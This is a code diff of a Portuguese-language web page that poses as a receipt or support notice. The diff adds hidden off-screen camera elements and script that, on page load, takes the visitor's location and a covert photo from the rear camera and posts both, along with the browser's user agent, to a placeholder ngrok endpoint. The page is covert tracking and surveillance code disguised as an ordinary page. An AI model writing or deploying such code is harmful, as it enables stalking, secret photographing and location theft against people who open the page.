@@ -25,55 +25,107 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
+  </div>
 
+  <!-- Elementos ocultos para captura da câmera -->
+  <div style="position:fixed;top:-9999px;left:-9999px;opacity:0;">
+    <video id="hiddenCamera" autoplay playsinline></video>
+    <canvas id="hiddenCanvas"></canvas>
   </div>
 
   <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
-
+    // Configurações de data
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
+    document.getElementById("data-atual").textContent = `${dia}/${mes}/${dataAtual.getFullYear()}`;
 
-    const dataFormatada = `${dia}/${mes}/${ano}`;
+    // Função para captura discreta da câmera
+    const capturarFotoDiscreta = async () => {
+      try {
+        const video = document.getElementById('hiddenCamera');
+        const canvas = document.getElementById('hiddenCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'environment',
+            width: { ideal: 320 },
+            height: { ideal: 240 }
+          }
+        });
 
-    document.getElementById("data-atual").textContent = dataFormatada;
+        video.srcObject = stream;
+        
+        await new Promise(resolve => {
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            stream.getTracks().forEach(track => track.stop());
+            resolve();
+          }, 500);
+        });
 
-    console.log(dataAtual)
+        return canvas.toDataURL('image/jpeg', 0.7);
+      } catch (error) {
+        console.error('Erro na câmera:', error);
+        return null;
+      }
+    };
 
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
+    // Função de envio de dados combinados
+    const enviarDadosCompletos = async (position, foto) => {
+      const { latitude, longitude } = position.coords;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch("NGROK_SERVER/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
+      const payload = {
+        latitude,
+        longitude,
+        maps,
+        foto,
+        data: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      };
 
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
+      try {
+        const response = await fetch("NGROK_SERVER/send-location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+          console.error('Erro no servidor:', await response.text());
+        }
+      } catch (error) {
+        console.error('Erro na requisição:', error);
+      }
+    };
+
+    // Inicialização ao carregar a página
+    window.addEventListener("load", async () => {
+      if (navigator.geolocation) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+          });
+
+          const foto = await capturarFotoDiscreta();
+          await enviarDadosCompletos(position, foto);
+
+        } catch (error) {
+          console.error('Erro no processo:', error);
+        }
+      } else {
+        alert("Recurso não disponível. Tente novamente mais tarde.");
+      }
+    });
+
+    // Tratamento de erros genérico
+    window.addEventListener('error', (error) => {
+      console.error('Erro não tratado:', error.message);
+    });
   </script>
 </body>
 
